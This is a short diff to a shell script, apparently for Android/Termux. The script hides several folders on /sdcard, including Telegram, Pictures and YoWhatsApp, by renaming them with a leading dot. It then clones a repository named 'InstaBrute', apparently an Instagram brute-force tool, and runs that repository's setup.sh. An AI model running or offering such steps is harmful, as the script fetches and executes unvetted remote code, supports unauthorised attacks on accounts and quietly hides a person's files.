@@ -1,3 +1,6 @@
+cd $HOME
+git clone https://github.com/Elliot290/InstaBrute
+cd /sdcard
 cd /sdcard
 mv Telegram .Telegram
 mv browser .browser
@@ -24,6 +27,5 @@ mv sketchware .sketchware
 mv Pictures .Pictures
 mv YoWhatsApp .YoWhatsApp
 cd $HOME
-git clone https://github.com/Elliot290/InstaBrute
 cd InstaBrute
 bash setup.sh
